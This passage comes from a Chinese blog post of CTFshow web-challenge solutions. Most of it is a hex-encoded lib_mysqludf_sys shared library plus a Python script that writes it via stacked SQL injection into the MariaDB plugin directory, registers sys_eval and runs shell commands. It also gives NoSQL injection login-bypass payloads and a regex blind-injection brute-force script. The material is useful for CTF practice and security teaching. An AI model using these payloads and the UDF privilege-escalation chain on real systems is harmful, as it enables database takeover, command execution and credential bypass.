0000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&quot;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">21510</span>, <span class="hljs-number">5000</span>):<br>      <span class="hljs-function"><span class="hljs-keyword">end</span> = <span class="hljs-title">i</span> + <span class="hljs-title">5000</span></span><br>      payload.append(udf[i:<span class="hljs-keyword">end</span>])<br>  <br>  p = dict(zip(<span class="hljs-keyword">text</span>, payload))<br>  <br>  <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-keyword">text</span>:<br>      url = base_url+<span class="hljs-string">&quot;?id=&#x27;;select unhex(&#x27;&#123;&#125;&#x27;) into dumpfile &#x27;/usr/lib/mariadb/plugin/&#123;&#125;.txt&#x27;--+&amp;page=1&amp;limit=10&quot;</span>.<span class="hljs-built_in">format</span>(p[t], t) <span class="hljs-comment">#UDF提权一般配合dumpfile 而不是outfile</span><br>      r = requests.<span class="hljs-built_in">get</span>(url)<br>      print(r.status_code)<br>  <br>  next_url = base_url+<span class="hljs-string">&quot;?id=&#x27;;select concat(load_file(&#x27;/usr/lib/mariadb/plugin/a.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/b.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/c.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/d.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/e.txt&#x27;)) into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so&#x27;-- +&amp;page=1&amp;limit=10&quot;</span> <span class="hljs-comment">#将各个txt文件合并到udf.so</span><br>  rn = requests.<span class="hljs-built_in">get</span>(next_url)<br>  <br>  uaf_url=base_url+<span class="hljs-string">&quot;?id=&#x27;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;--+&quot;</span><span class="hljs-comment">#创建udf函数</span><br>  r=requests.<span class="hljs-built_in">get</span>(uaf_url)<br>  nn_url = base_url+<span class="hljs-string">&quot;?id=&#x27;;select sys_eval(&#x27;cat /flag.*&#x27;);-- +&amp;page=1&amp;limit=10&quot;</span><span class="hljs-comment">#执行命令并查看</span><br>  rnn = requests.<span class="hljs-built_in">get</span>(nn_url)<br>  print(rnn.<span class="hljs-keyword">text</span>)<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h3><ul>
+<li><p>nosql注入</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>&#x2F;api&#x2F;?id[]&#x3D;flag</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><br>### web250<br><br>- ```<br>  username[<span class="hljs-symbol">$</span><span class="hljs-keyword">ne</span>]=<span class="hljs-number">1</span>&amp;password[<span class="hljs-symbol">$</span><span class="hljs-keyword">ne</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h3><ul>
+<li>&#96;&#96;&#96;<br>username[$ne]&#x3D;admin&amp;password[$ne]&#x3D;1<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><br><span class="hljs-comment">### Web252</span><br><br>- ```<br>  username[<span class="hljs-variable">$regex</span>]=^[^a].*<span class="hljs-variable">$&amp;</span>password[<span class="hljs-variable">$ne</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h3><ul>
+<li><p>无回显</p>
+</li>
+<li><p>利用regex正则盲注</p>
+</li>
+<li><pre><code class="python">import requests
+url=&quot;http://73acfdad-dba7-48b6-a770-1562af8ccf38.challenge.ctf.show/api/index.php&quot;
+flag=&quot;ctfshow&#123;&quot;
+s=&#39;0123456789abcdef-&#125;&#39;
+for i in range(9,46):
+    print(i)
+    for j in s:
+        data=&#123;
+            &#39;username[$ne]&#39;:&#39;1&#39;,
+            &#39;password[$regex]&#39;:f&#39;^&#123;flag+j&#125;&#39;
+        &#125;
+        r=requests.post(url=url,data=data)
+        if r&quot;\u767b\u9646\u6210\u529f&quot; in r.text:
+            flag+=j
+            print(flag)
+            if j==&quot;&#125;&quot;:
+                exit()
+            break
+</code></pre>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctfshow/" class="category-chain-item">ctfshow</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTF_show_Web入门_sql注入</div>
+      <div>http://example.com/2022/07/21/CTF_show_Web入门_sql注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年7月21日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/" title="CTF_show_Web入门_php特性">
+                        <span class="hidden-mobile">CTF_show_Web入门_php特性</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
